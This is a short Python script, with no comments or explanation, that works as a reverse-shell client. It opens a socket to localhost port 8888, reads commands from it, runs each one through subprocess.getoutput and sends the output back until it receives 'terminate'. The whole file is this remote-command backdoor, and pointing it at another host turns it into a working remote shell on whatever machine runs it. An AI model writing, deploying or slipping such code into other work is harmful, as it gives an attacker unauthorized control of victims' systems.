import socket
import subprocess


def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('localhost', 8888))
    while True:
        command = s.recv(4096).decode()
        if not command:
            continue
        if 'terminate' in command:
            s.close()
            break
        output = subprocess.getoutput(command)
        s.send(output.encode())


if __name__ == '__main__':
    connect()
